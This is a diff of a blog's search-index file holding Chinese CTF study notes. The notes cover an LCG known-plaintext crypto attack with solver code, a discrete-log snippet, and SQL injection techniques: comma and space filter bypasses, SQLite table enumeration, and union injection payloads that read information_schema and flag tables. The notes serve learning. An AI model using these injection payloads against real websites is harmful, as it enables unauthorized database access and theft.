@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>LCG（线性同余生成器）简记</title>
+      <link href="/blog/2026/02/08/LCG/"/>
+      <url>/blog/2026/02/08/LCG/</url>
+      
+        <content type="html"><![CDATA[<p> LCG（线性同余生成器）简记 </p><p>标签（空格分隔）： LCG</p><hr><h2 id="LCG-线性同余生成器"><a href="#LCG-线性同余生成器" class="headerlink" title="LCG(线性同余生成器)"></a>LCG(线性同余生成器)</h2><p>LCG属于PRNG(伪随机数生成器)和stream cipher(流密码)的一种，是一种产生伪随机数的方法。</p><br><center>$X_{n+1} =(a∗X_n +b) \ mod\ m$</center><br><p>其中，Xn代表第n个生成的随机数，X0被称为种子值。这里还定义了三个整数：a乘数、b增量、m模数，是产生器设定的常数。</p><p>1、m是随机序列的模数，必须一个大于0的正整数。一般是一个比较大的素数或者是2的幂，以便提供较长的周期长度。<br>2、a是乘数，必须是一个与m互素的正整数。<br>3、b是增量，也必须是一个与m互素的正整数。<br>4、$t_n$ &#x3D; $X_{n+1}$ -$X_{n}$,同理$t_{n-1}$&#x3D;$X_{n}$ -$X_{n-1}$</p><hr><p>##求其中参数公式如下</p><hr><p>###<strong>由$X_n$反推$X_{n+1}$</strong></p><center>$X_{n} = a^{-1}*(X_{n+1} -b) \mod m$</center><p>Ps：<strong>$a^{-1}$是a的逆元</strong></p><hr><p>###求a</p><p>求a可以表示为</p><center>$a=t_{n-1}^{-1}*t_{n}  \ mod \ m$</center><br><p>Ps：<strong>$t_{n-1}^{-1}$是$t_{n-1}$的逆元</strong></p><br><hr><p>###求b</p><center> $b = (X_{n+1} - a*X_{n}) \ mod \ m$ </center><hr><p>###求m</p><center>$t_{n}=X_{n+1}-X_{n}=(a*X_n+b)-(a*X_{n-1}+b)=a*(X_n-X_{n-1})=a*t_{n-1}\mod\ m$</center><center>$t_{n+1} t_{n-1} - t_n t_n = a*a*t_{n-1}*t_{n-1} - a*t_{n-1}*a*t_{n-1} = 0 \mod m$</center><p>即$T_n &#x3D; t_{n+1} t_{n-1} - t_n^2$是 m 的倍数，故$T_n 和 T_{n-1}$的最大公因数即为 m</p><hr><p>###例题<br>实际做题的话碰到直接给了a,b,m这些便很好解决如果是碰上别的如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from secrets import randbits</span><br><span class="line">from secret import FLAG, P_known</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen():</span><br><span class="line">    while True:</span><br><span class="line">        m = randbits(63) | (1 &lt;&lt; 62) | 1</span><br><span class="line">        if m &gt; 2**62:</span><br><span class="line">            break</span><br><span class="line">    a = randbits(62) | 3</span><br><span class="line">    c = randbits(62) | 1</span><br><span class="line">    s0 = randbits(62) | 5</span><br><span class="line">    return m, a, c, s0</span><br><span class="line"></span><br><span class="line">def LCG(m, a, c, s0, nblocks):</span><br><span class="line">    x = s0</span><br><span class="line">    out = []</span><br><span class="line">    for _ in range(nblocks):</span><br><span class="line">        x = (a * x + c) % m</span><br><span class="line">        out.append(x)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def encrypt(m, a, c, s0, plaintext: bytes) -&gt; bytes:</span><br><span class="line">    padlen = (-len(plaintext)) % 8</span><br><span class="line">    pt = plaintext + b&#x27;\x00&#x27; * padlen</span><br><span class="line">    blocks = [int.from_bytes(pt[i:i+8], &#x27;big&#x27;) for i in range(0, len(pt), 8)]</span><br><span class="line">    ks = LCG(m, a, c, s0, len(blocks))</span><br><span class="line">    cblocks = [b ^ k for b, k in zip(blocks, ks)]</span><br><span class="line">    return b&#x27;&#x27;.join(cb.to_bytes(8, &#x27;big&#x27;) for cb in cblocks)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    m, a, c, s0 = gen()</span><br><span class="line">    cipher  = encrypt(m, a, c, s0,  P_known + FLAG)</span><br><span class="line"></span><br><span class="line">    C_known = cipher[:len(P_known)]</span><br><span class="line">    C_flag  = cipher[len(P_known):len(P_known) + len(FLAG)]</span><br><span class="line"></span><br><span class="line">    print(&quot;P_known =&quot;,P_known)</span><br><span class="line">    print(&quot;C_known =&quot;, C_known.hex())</span><br><span class="line">    print(&quot;C_flag  =&quot;, C_flag.hex())</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">P_know = b&#x27;Insecure_linear_congruential_random_number!!!!!!&#x27;</span><br><span class="line">C_known = 44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a</span><br><span class="line">C_flag  = 1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>这个便是已知明文攻击，将明文和密文已知部分进行异或便能得到一部分的$X_{n}$<br>然后再是正常解题<br>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from secrets import randbits</span><br><span class="line">import sys</span><br><span class="line">from functools import reduce</span><br><span class="line">from math import gcd</span><br><span class="line">import gmpy2</span><br><span class="line">p_know = b&#x27;Insecure_linear_congruential_random_number!!!!!!&#x27;</span><br><span class="line">c_know = &#x27;44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a&#x27;</span><br><span class="line">c_flag  =  &#x27;1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a&#x27;</span><br><span class="line"></span><br><span class="line">c_know = bytes.fromhex(c_know)</span><br><span class="line">c_flag = bytes.fromhex(c_flag)</span><br><span class="line"></span><br><span class="line">c_know=[int.from_bytes(c_know[i:i+8], &#x27;big&#x27;) for i in range(0, len(c_know), 8)]</span><br><span class="line">p_know=[int.from_bytes(p_know[i:i+8], &#x27;big&#x27;) for i in range(0, len(p_know), 8)]</span><br><span class="line"></span><br><span class="line">box = [p ^ c for p, c in zip(p_know, c_know)]</span><br><span class="line">t = [box[i+1]-box[i] for i in range(len(box)-1)]</span><br><span class="line">T1= t[3]*t[1]-t[2]*t[2]</span><br><span class="line">T2= t[4]*t[2]-t[3]*t[3]</span><br><span class="line"></span><br><span class="line">def egcd(a,b):</span><br><span class="line">    if a==0 :</span><br><span class="line">        return b</span><br><span class="line">    else :</span><br><span class="line">        return gcd(b%a,a)</span><br><span class="line"></span><br><span class="line">m=egcd(T1,T2)</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">t1=box[2]-box[1]</span><br><span class="line">t0=box[1]-box[0]</span><br><span class="line">a=gmpy2.divm(t1,t0,m)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">b=(box[2]-box[1]*a)%m</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">def LCG(m, a, c, s0, nblocks):</span><br><span class="line">    x = s0         </span><br><span class="line">    out = []      </span><br><span class="line">    for _ in range(nblocks):</span><br><span class="line">        out.append(x)           </span><br><span class="line">        x = (a * x + c) % m     </span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">abox = LCG(m, a, b, box[0], 22)</span><br><span class="line"></span><br><span class="line">abox = LCG(m, a, b, box[0], 22)</span><br><span class="line">raw_c_know = bytes.fromhex(&#x27;44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a&#x27;)</span><br><span class="line">raw_c_flag = bytes.fromhex(&#x27;1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a&#x27;)</span><br><span class="line"></span><br><span class="line">allm = raw_c_know + raw_c_flag</span><br><span class="line"></span><br><span class="line">keystream = b&#x27;&#x27;.join(k.to_bytes(8, &#x27;big&#x27;) for k in abox)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytes([c ^ k for c, k in zip(allm, keystream)])</span><br><span class="line">print(flag.decode(errors=&#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Crypto </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> LCG </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP伪协议</title>
       <link href="/blog/2026/02/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
       <url>/blog/2026/02/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
@@ -21,31 +46,6 @@
         <tags>
             
             <tag> PHP </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL&quot;,&quot;号绕过</title>
-      <link href="/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
-      <url>/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQL”-”号绕过"><a href="#SQL”-”号绕过" class="headerlink" title="SQL”,”号绕过"></a>SQL”,”号绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL绕过 </tag>
             
         </tags>
       
@@ -79,6 +79,81 @@
     
     
     <entry>
+      <title>SQL&quot;,&quot;号绕过</title>
+      <link href="/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
+      <url>/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL”-”号绕过"><a href="#SQL”-”号绕过" class="headerlink" title="SQL”,”号绕过"></a>SQL”,”号绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQLite</title>
+      <link href="/blog/2026/01/28/SQLite/"/>
+      <url>/blog/2026/01/28/SQLite/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL union联合注入</title>
+      <link href="/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
+      <url>/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL-union联合注入"><a href="#SQL-union联合注入" class="headerlink" title="SQL union联合注入"></a>SQL union联合注入</h1><p>标签（空格分隔）： SQL</p><p>—首先数据库的定义: 数据的组织结构分为数据库(database)、数据表(table)、数据行(row)、字段(field)</p><p>重要点:union的使用,union</p><p>查表用：<code>1&#39; order by (数字)#</code><br>‘&#x2F;&#x2F;该过程的作用是查询有几列，一直查询到不能查询为止<br>&#x2F;&#x2F;#号的作用是将后面的代码给注释掉</p><p>当想将一些弹出的东西给查询失效只需要：<br><code>1&#39; union select 1,2,...(查询所弹出的数组)</code><br>&#x2F;&#x2F;同时得到可以回显的列表<br>&#x2F;&#x2F;目的还是将页面变得整洁，并且得到列</p><p>当想知道某个数据库的名字只用：<br><code>1&#39; union select 1,2(可以回显的列表,但是要求从1一直到可以查询的列但只能到一个比如1，2),database()#</code><br>&#x2F;&#x2F;database()函数的目的就是获取名字<br>&#x2F;&#x2F;数字一定要从1开始到能回显的一个</p><p>想要获取所属的表的名字：<br><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;（）&#39;--+#</code><br>&#x2F;&#x2F;首先group concat(table name)的作用是获取  ‘数据库’  的所有的表的名字并组合成一个字符串，简洁一点说就是知道数据表<br>&#x2F;&#x2F;然后table_name: 信息模式(information_schema)中tables表的列名，包含所有表名<br>&#x2F;&#x2F;查询表information_schema.tables: 系统表，存储了关于数据库中所有表的信息<br>&#x2F;&#x2F;再进行一个限制table_schema&#x3D;’news’: 条件限制，只查询属于”news”数据库的表</p><p>再查询他的列：<br><code>?wllm=2&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;test_tb&#39;--+</code><br>&#x2F;&#x2F;这样可以获得所有的列的名字</p><p>如果有的列的名字带有flag：<br><code>2&#39;union select 1,2,flag from test_tb--+#</code></p><p>‘union select 1,2,flag from test_tb–+#</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL空格绕过</title>
       <link href="/blog/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
       <url>/blog/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</url>
@@ -96,6 +171,31 @@
         <tags>
             
             <tag> SQL绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Crypto实用函数类</title>
+      <link href="/blog/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/"/>
+      <url>/blog/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/</url>
+      
+        <content type="html"><![CDATA[<h1 id="crypto-python函数类"><a href="#crypto-python函数类" class="headerlink" title="crypto python函数类"></a>crypto python函数类</h1><p>标签（空格分隔）： crypto</p><hr><p>求$a^{x} &#x3D; c \mod m $</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sympy.ntheory import discrete_log</span><br><span class="line">M = 100000000000099</span><br><span class="line">c = 114514</span><br><span class="line">a = 13</span><br><span class="line">x = discrete_log(M, c, a)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>使用discrete_log库的discrete_log</p><hr>]]></content>
+      
+      
+      <categories>
+          
+          <category> Crypto </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
             
         </tags>
       
@@ -154,56 +254,6 @@
     
     
     <entry>
-      <title>SQL union联合注入</title>
-      <link href="/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
-      <url>/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQL-union联合注入"><a href="#SQL-union联合注入" class="headerlink" title="SQL union联合注入"></a>SQL union联合注入</h1><p>标签（空格分隔）： SQL</p><p>—首先数据库的定义: 数据的组织结构分为数据库(database)、数据表(table)、数据行(row)、字段(field)</p><p>重要点:union的使用,union</p><p>查表用：<code>1&#39; order by (数字)#</code><br>‘&#x2F;&#x2F;该过程的作用是查询有几列，一直查询到不能查询为止<br>&#x2F;&#x2F;#号的作用是将后面的代码给注释掉</p><p>当想将一些弹出的东西给查询失效只需要：<br><code>1&#39; union select 1,2,...(查询所弹出的数组)</code><br>&#x2F;&#x2F;同时得到可以回显的列表<br>&#x2F;&#x2F;目的还是将页面变得整洁，并且得到列</p><p>当想知道某个数据库的名字只用：<br><code>1&#39; union select 1,2(可以回显的列表,但是要求从1一直到可以查询的列但只能到一个比如1，2),database()#</code><br>&#x2F;&#x2F;database()函数的目的就是获取名字<br>&#x2F;&#x2F;数字一定要从1开始到能回显的一个</p><p>想要获取所属的表的名字：<br><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;（）&#39;--+#</code><br>&#x2F;&#x2F;首先group concat(table name)的作用是获取  ‘数据库’  的所有的表的名字并组合成一个字符串，简洁一点说就是知道数据表<br>&#x2F;&#x2F;然后table_name: 信息模式(information_schema)中tables表的列名，包含所有表名<br>&#x2F;&#x2F;查询表information_schema.tables: 系统表，存储了关于数据库中所有表的信息<br>&#x2F;&#x2F;再进行一个限制table_schema&#x3D;’news’: 条件限制，只查询属于”news”数据库的表</p><p>再查询他的列：<br><code>?wllm=2&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;test_tb&#39;--+</code><br>&#x2F;&#x2F;这样可以获得所有的列的名字</p><p>如果有的列的名字带有flag：<br><code>2&#39;union select 1,2,flag from test_tb--+#</code></p><p>‘union select 1,2,flag from test_tb–+#</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQLite</title>
-      <link href="/blog/2026/01/28/SQLite/"/>
-      <url>/blog/2026/01/28/SQLite/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>PHP魔术技巧</title>
       <link href="/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/"/>
       <url>/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/</url>
@@ -254,56 +304,6 @@
     
     
     <entry>
-      <title>Crypto实用函数类</title>
-      <link href="/blog/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/"/>
